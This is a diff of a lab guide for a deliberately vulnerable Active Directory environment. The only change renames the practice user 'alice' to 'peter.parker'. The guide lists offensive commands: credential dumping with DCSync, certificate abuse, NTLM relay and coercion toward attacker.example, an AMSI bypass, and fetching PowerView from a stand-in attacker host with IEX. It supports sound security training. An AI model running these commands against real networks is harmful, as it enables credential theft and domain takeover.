@@ -215,25 +215,25 @@ Example variations:
 
 ```bash
 # Password auth
-impacket-secretsdump corp.local/alice:'DVADlab2024!'@10.10.0.10
+impacket-secretsdump corp.local/peter.parker:'DVADlab2024!'@10.10.0.10
 
 # NTLM pass-the-hash
-impacket-secretsdump -hashes :a4f49c4... corp.local/alice@10.10.0.10
+impacket-secretsdump -hashes :a4f49c4... corp.local/peter.parker@10.10.0.10
 
 # Kerberos (cache must be set)
-impacket-secretsdump -k -no-pass corp.local/alice@dc01.corp.local
+impacket-secretsdump -k -no-pass corp.local/peter.parker@dc01.corp.local
 
 # Offline NTDS
 impacket-secretsdump -system SYSTEM.save -ntds ntds.dit LOCAL
 
 # DCSync just-krbtgt with explicit DC IP and Kerberos
-KRB5CCNAME=/tmp/alice.ccache \
+KRB5CCNAME=/tmp/peter.parker.ccache \
 impacket-secretsdump -k -no-pass -just-dc-user krbtgt \
-        -dc-ip 10.10.0.10 corp.local/alice@dc01.corp.local
+        -dc-ip 10.10.0.10 corp.local/peter.parker@dc01.corp.local
 
 # Use AES key instead of password / NT hash
 impacket-secretsdump -aesKey <hex-256-bit> \
-        corp.local/alice@dc01.corp.local
+        corp.local/peter.parker@dc01.corp.local
 ```
 
 ### Tips that save hours
@@ -266,12 +266,12 @@ impacket-secretsdump -aesKey <hex-256-bit> \
 ```bash
 # Discover vulnerabilities (ESC1..ESC16)
 certipy find \
-        -u alice@corp.local -p 'DVADlab2024!' \
+        -u peter.parker@corp.local -p 'DVADlab2024!' \
         -dc-ip 10.10.0.10 -text -stdout
 
 # Enroll a cert
 certipy req \
-        -u alice@corp.local -p '...' \
+        -u peter.parker@corp.local -p '...' \
         -ca CORP-CA -template ESC1Template \
         -upn Administrator@corp.local
 
@@ -279,18 +279,18 @@ certipy req \
 certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
 
 # Shadow Credentials
-certipy shadow auto -u alice -p '...' -account 'sql01$' -dc-ip 10.10.0.10
+certipy shadow auto -u peter.parker -p '...' -account 'sql01$' -dc-ip 10.10.0.10
 
 # Modify a template (ESC4)
-certipy template -u alice -p '...' -dc-ip 10.10.0.10 -template VulnTemplate
+certipy template -u peter.parker -p '...' -dc-ip 10.10.0.10 -template VulnTemplate
 
 # Create / modify a computer account (Certifried prep)
-certipy account create -u alice -p '...' -user 'EVIL$' -pass 'X!1' \
+certipy account create -u peter.parker -p '...' -user 'EVIL$' -pass 'X!1' \
         -dns dc01.corp.local
 
 # CA-level operations
-certipy ca -u alice -p '...' -ca CORP-CA -list-templates
-certipy ca -u alice -p '...' -ca CORP-CA -add-officer alice
+certipy ca -u peter.parker -p '...' -ca CORP-CA -list-templates
+certipy ca -u peter.parker -p '...' -ca CORP-CA -add-officer peter.parker
 
 # Offline cert forgery from a stolen CA key
 certipy forge -ca-pfx ca.pfx -upn Administrator@corp.local
@@ -339,7 +339,7 @@ Two parts:
 
   ```bash
   bloodhound-python \
-          -d corp.local -u alice -p 'DVADlab2024!' \
+          -d corp.local -u peter.parker -p 'DVADlab2024!' \
           -ns 10.10.0.10 \
           -c All --zip
   ```
@@ -431,42 +431,42 @@ config in `~/.nxc/nxc.conf`.
 
 ```bash
 # SMB
-nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!'           # try creds across subnet
-nxc smb 10.10.0.10 -u alice -p '...' --shares             # list shares
-nxc smb 10.10.0.10 -u alice -p '...' --sessions           # active sessions
-nxc smb 10.10.0.10 -u alice -p '...' --users              # users (via SAMR)
-nxc smb 10.10.0.10 -u alice -p '...' --pass-pol           # password policy
-nxc smb 10.10.0.10 -u alice -p '...' --rid-brute          # RID-cycling
+nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!'           # try creds across subnet
+nxc smb 10.10.0.10 -u peter.parker -p '...' --shares             # list shares
+nxc smb 10.10.0.10 -u peter.parker -p '...' --sessions           # active sessions
+nxc smb 10.10.0.10 -u peter.parker -p '...' --users              # users (via SAMR)
+nxc smb 10.10.0.10 -u peter.parker -p '...' --pass-pol           # password policy
+nxc smb 10.10.0.10 -u peter.parker -p '...' --rid-brute          # RID-cycling
 
 # LDAP
-nxc ldap 10.10.0.10 -u alice -p '...' --kerberoasting kerb.out
-nxc ldap 10.10.0.10 -u alice -p '...' --asreproast asrep.out
-nxc ldap 10.10.0.10 -u alice -p '...' --bloodhound -c All --dns-server 10.10.0.10
-nxc ldap 10.10.0.10 -u alice -p '...' --get-desc-users   # find passwords in description
+nxc ldap 10.10.0.10 -u peter.parker -p '...' --kerberoasting kerb.out
+nxc ldap 10.10.0.10 -u peter.parker -p '...' --asreproast asrep.out
+nxc ldap 10.10.0.10 -u peter.parker -p '...' --bloodhound -c All --dns-server 10.10.0.10
+nxc ldap 10.10.0.10 -u peter.parker -p '...' --get-desc-users   # find passwords in description
 
 # WinRM
-nxc winrm 10.10.0.100 -u alice -p '...' -x 'whoami'
+nxc winrm 10.10.0.100 -u peter.parker -p '...' -x 'whoami'
 
 # MSSQL
 nxc mssql 10.10.0.14 -u sa -p 'SqlServer2025!' --local-auth -q 'select @@version'
 nxc mssql 10.10.0.14 -u sa -p '...' --local-auth -x 'whoami /priv'
 
 # RDP (auth check; no shell)
-nxc rdp 10.10.0.100 -u alice -p '...'
+nxc rdp 10.10.0.100 -u peter.parker -p '...'
 
 # Pass-the-hash
-nxc smb 10.10.0.0/21 -u alice -H <NTHASH>
+nxc smb 10.10.0.0/21 -u peter.parker -H <NTHASH>
 
 # Module list
 nxc smb -L                                                 # see all modules
-nxc smb 10.10.0.0/21 -u alice -p '...' -M zerologon -o ACTION=scan
-nxc smb 10.10.0.10 -u alice -p '...' -M nopac
-nxc smb 10.10.0.10 -u alice -p '...' -M coerce_plus
-nxc smb 10.10.0.10 -u alice -p '...' -M lsassy
-nxc smb 10.10.0.10 -u alice -p '...' -M ntdsutil
-nxc smb 10.10.0.10 -u alice -p '...' -M laps
-nxc smb 10.10.0.10 -u alice -p '...' -M gpp_password
-nxc smb 10.10.0.10 -u alice -p '...' -M slinky -o KEY='\\attacker\share\image.ico'
+nxc smb 10.10.0.0/21 -u peter.parker -p '...' -M zerologon -o ACTION=scan
+nxc smb 10.10.0.10 -u peter.parker -p '...' -M nopac
+nxc smb 10.10.0.10 -u peter.parker -p '...' -M coerce_plus
+nxc smb 10.10.0.10 -u peter.parker -p '...' -M lsassy
+nxc smb 10.10.0.10 -u peter.parker -p '...' -M ntdsutil
+nxc smb 10.10.0.10 -u peter.parker -p '...' -M laps
+nxc smb 10.10.0.10 -u peter.parker -p '...' -M gpp_password
+nxc smb 10.10.0.10 -u peter.parker -p '...' -M slinky -o KEY='\\attacker\share\image.ico'
 ```
 
 NetExec writes results to `~/.nxc/logs/` and a SQLite DB at
@@ -494,30 +494,30 @@ The de facto WinRM shell. Drop-in PowerShell remoting from Linux.
 
 ```bash
 # Password
-evil-winrm -i 10.10.0.10 -u alice -p 'DVADlab2024!'
+evil-winrm -i 10.10.0.10 -u peter.parker -p 'DVADlab2024!'
 
 # PTH
 evil-winrm -i 10.10.0.10 -u Administrator -H a4f49c4...
 
 # Kerberos (cache must be set; krb5.conf configured)
-KRB5CCNAME=/tmp/alice.ccache \
+KRB5CCNAME=/tmp/peter.parker.ccache \
 evil-winrm -i 10.10.0.10 -u Administrator -r CORP.LOCAL
 
 # Local scripts directory (auto-uploaded)
-evil-winrm -i 10.10.0.10 -u alice -p '...' \
+evil-winrm -i 10.10.0.10 -u peter.parker -p '...' \
         -s /opt/PowerView.ps1 -e /opt/binaries/
 
 # SSL
-evil-winrm -i 10.10.0.10 -u alice -p '...' -S
+evil-winrm -i 10.10.0.10 -u peter.parker -p '...' -S
 ```
 
 Useful menu commands inside the shell:
 
 ```
-*Evil-WinRM* PS> upload localfile.txt C:\Users\alice\file.txt
+*Evil-WinRM* PS> upload localfile.txt C:\Users\peter.parker\file.txt
 *Evil-WinRM* PS> download C:\Path\file.txt loot/file.txt
 *Evil-WinRM* PS> menu                       # show built-in cmds
-*Evil-WinRM* PS> Invoke-Binary /opt/binaries/Rubeus.exe 'kerberoast /outfile:C:\users\alice\k.txt'
+*Evil-WinRM* PS> Invoke-Binary /opt/binaries/Rubeus.exe 'kerberoast /outfile:C:\users\peter.parker\k.txt'
 *Evil-WinRM* PS> Bypass-4MSI                # AMSI bypass
 *Evil-WinRM* PS> Donut-Loader -p Rubeus.bin # in-memory loader
 *Evil-WinRM* PS> services                   # list services
@@ -639,7 +639,7 @@ ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp \
 # Relay to LDAPS, grant RBCD (or dump LDAP / mod attributes)
 ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access -smb2support
 ntlmrelayx.py -t ldaps://dc01.corp.local --dump-laps -smb2support
-ntlmrelayx.py -t ldaps://dc01.corp.local --escalate-user alice -smb2support
+ntlmrelayx.py -t ldaps://dc01.corp.local --escalate-user peter.parker -smb2support
 
 # Relay to LDAP, add shadow credential
 ntlmrelayx.py -t ldap://dc01.corp.local \
@@ -689,7 +689,7 @@ Coercion primitives. All cause a target Windows host to authenticate
 ```bash
 # PetitPotam (MS-EFSR — EfsRpcOpenFileRaw and several others)
 python3 PetitPotam.py \
-        -d corp.local -u alice -p '...' \
+        -d corp.local -u peter.parker -p '...' \
         attacker.example dc01.corp.local
 
 # SpoolSample / PrinterBug (MS-RPRN)
@@ -698,12 +698,12 @@ python3 SpoolSample.py \
 
 # DFSCoerce (MS-DFSNM)
 python3 dfscoerce.py \
-        -u alice -p '...' -d corp.local \
+        -u peter.parker -p '...' -d corp.local \
         attacker.example dc01.corp.local
 
 # Coercer (multi-protocol; tries everything)
 python3 Coercer.py coerce \
-        -u alice -p '...' -d corp.local \
+        -u peter.parker -p '...' -d corp.local \
         -l attacker.example -t dc01.corp.local
 ```
 
@@ -787,9 +787,9 @@ Key commands (see Appendix Z in `WALKTHROUGH.md`):
 Rubeus.exe asreproast /format:hashcat /outfile:r.txt
 Rubeus.exe kerberoast /outfile:k.txt /nowrap
 Rubeus.exe kerberoast /user:svc_iis /rc4opsec /outfile:k.txt
-Rubeus.exe asktgt /user:alice /password:'...' /nowrap /ptt
-Rubeus.exe asktgt /user:alice /rc4:<NT> /nowrap /ptt
-Rubeus.exe asktgt /user:alice /aes256:<key> /nowrap /ptt
+Rubeus.exe asktgt /user:peter.parker /password:'...' /nowrap /ptt
+Rubeus.exe asktgt /user:peter.parker /rc4:<NT> /nowrap /ptt
+Rubeus.exe asktgt /user:peter.parker /aes256:<key> /nowrap /ptt
 Rubeus.exe s4u /user:svc /rc4:... /impersonateuser:Administrator \
               /msdsspn:cifs/file01.corp.local /ptt
 Rubeus.exe tgtdeleg /nowrap
@@ -882,20 +882,20 @@ paths without booting BloodHound's collector.
 
 ```bash
 # Reset a user's password
-bloodyAD -d corp.local -u alice -p '...' --host dc01.corp.local \
+bloodyAD -d corp.local -u peter.parker -p '...' --host dc01.corp.local \
         set password 'victim' 'NewPass1!'
 
 # Add to a group
-bloodyAD ... add groupMember "Domain Admins" alice
+bloodyAD ... add groupMember "Domain Admins" peter.parker
 
 # Set RBCD
 bloodyAD ... add rbcd 'FILE01$' 'EVIL$'
 
 # Grant GenericAll
-bloodyAD ... add genericAll victim alice
+bloodyAD ... add genericAll victim peter.parker
 
 # Take ownership
-bloodyAD ... set owner "AdminSDHolder" alice
+bloodyAD ... set owner "AdminSDHolder" peter.parker
 
 # Plant Shadow Credentials
 bloodyAD ... add shadowCredentials 'sql01$'
@@ -935,9 +935,9 @@ PowerView is the PowerShell AD enumeration toolkit. Drop and import:
 ```powershell
 PS> IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')
 PS> Get-DomainUser -SPN
-PS> Get-DomainObject -Identity alice -Properties memberof,description
+PS> Get-DomainObject -Identity peter.parker -Properties memberof,description
 PS> Find-InterestingDomainAcl -ResolveGUIDs
-PS> Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity alice \
+PS> Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity peter.parker \
         -Rights All
 PS> Get-DomainGPOLocalGroup
 PS> Invoke-EnumerateLocalAdmin -ComputerName ws01.corp.local
@@ -946,10 +946,10 @@ PS> Invoke-EnumerateLocalAdmin -ComputerName ws01.corp.local
 `ldeep` and `ldapdomaindump` are Linux equivalents:
 
 ```bash
-ldeep ldap -u alice -p '...' -d corp.local -s ldap://dc01.corp.local \
+ldeep ldap -u peter.parker -p '...' -d corp.local -s ldap://dc01.corp.local \
         all -o loot/ldeep
 
-ldapdomaindump -u 'CORP\alice' -p 'DVADlab2024!' dc01.corp.local -o loot/ldd
+ldapdomaindump -u 'CORP\peter.parker' -p 'DVADlab2024!' dc01.corp.local -o loot/ldd
 # Output: HTML + JSON + GRP/SID files. Open in browser.
 ```
 
@@ -969,9 +969,9 @@ ldapdomaindump -u 'CORP\alice' -p 'DVADlab2024!' dc01.corp.local -o loot/ldd
 - **`enum4linux-ng`** — quick SMB null/auth enumeration. First thing to
   run against an unknown host.
 - **`smbmap`** — enumerate accessible shares quickly:
-  `smbmap -u alice -p '...' -d corp.local -H 10.10.0.13 -R`.
+  `smbmap -u peter.parker -p '...' -d corp.local -H 10.10.0.13 -R`.
 - **`smbclient`** — interactive SMB:
-  `smbclient //file01/share -U corp.local/alice%'DVADlab2024!'`.
+  `smbclient //file01/share -U corp.local/peter.parker%'DVADlab2024!'`.
 - **`gMSADumper.py`** — read msDS-ManagedPassword from gMSA accounts you
   can read.
 - **`addcomputer.py`** — create machine accounts via SAMR or LDAPS
@@ -1004,7 +1004,7 @@ ldapdomaindump -u 'CORP\alice' -p 'DVADlab2024!' dc01.corp.local -o loot/ldd
 A few tooling-agnostic habits:
 
 1. **Use the same Kerberos ccache for everything.** Set
-   `KRB5CCNAME=/tmp/alice.ccache`; chain getTGT → getST → psexec without
+   `KRB5CCNAME=/tmp/peter.parker.ccache`; chain getTGT → getST → psexec without
    retyping passwords.
 2. **Tee everything.** `2>&1 | tee logs/$(date +%Y%m%d-%H%M%S)-$tool.log`.
    You'll want the audit trail later.
@@ -1072,7 +1072,7 @@ Test a download from a Windows victim:
 
 ```
 PS> IEX (New-Object Net.WebClient).DownloadString('http://10.10.0.1:8000/PowerView.ps1')
-PS> Get-DomainUser -Identity alice
+PS> Get-DomainUser -Identity peter.parker
 ```
 
 ### Exercise 7.B — Set the time
@@ -1086,40 +1086,40 @@ date    # should match the DC's date
 Confirm with `klist`-able TGT:
 
 ```bash
-impacket-getTGT corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
+impacket-getTGT corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
 ```
 
 ### Exercise 7.C — Drop a Kerberos ccache and reuse it
 
 ```bash
-impacket-getTGT corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
-mv alice.ccache /tmp/alice.ccache
-export KRB5CCNAME=/tmp/alice.ccache
-klist     # should show alice's TGT
+impacket-getTGT corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
+mv peter.parker.ccache /tmp/peter.parker.ccache
+export KRB5CCNAME=/tmp/peter.parker.ccache
+klist     # should show peter.parker's TGT
 impacket-secretsdump -k -no-pass -dc-ip 10.10.0.10 \
-        corp.local/alice@dc01.corp.local
+        corp.local/peter.parker@dc01.corp.local
 ```
 
 ### Exercise 7.D — Run BloodHound
 
 ```bash
-bloodhound-python -d corp.local -u alice -p 'DVADlab2024!' \
+bloodhound-python -d corp.local -u peter.parker -p 'DVADlab2024!' \
         -ns 10.10.0.10 -c All --zip
 neo4j start
 bloodhound &
 # Drag-drop the zip into the GUI, run "Shortest paths to Domain Admins"
 ```
 
-Mark alice as owned. Inspect the path. Annotate each edge in your notes.
+Mark peter.parker as owned. Inspect the path. Annotate each edge in your notes.
 
 ### Exercise 7.E — NetExec sweep
 
 ```bash
-nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!'
-nxc winrm 10.10.0.0/21 -u alice -p 'DVADlab2024!'
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --kerberoasting kerb.hash
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --asreproast asrep.hash
-nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!' -M lsassy
+nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!'
+nxc winrm 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!'
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --kerberoasting kerb.hash
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --asreproast asrep.hash
+nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' -M lsassy
 ```
 
 Save the outputs to `notes/recon/`.
@@ -1141,8 +1141,8 @@ relayed connection.
 Practice format conversions:
 
 ```bash
-impacket-ticketConverter alice.ccache alice.kirbi
-impacket-ticketConverter alice.kirbi alice.ccache
+impacket-ticketConverter peter.parker.ccache peter.parker.kirbi
+impacket-ticketConverter peter.parker.kirbi peter.parker.ccache
 
 openssl pkcs12 -in administrator.pfx -nocerts -nodes -out admin.key
 openssl pkcs12 -in administrator.pfx -nokeys -out admin.crt
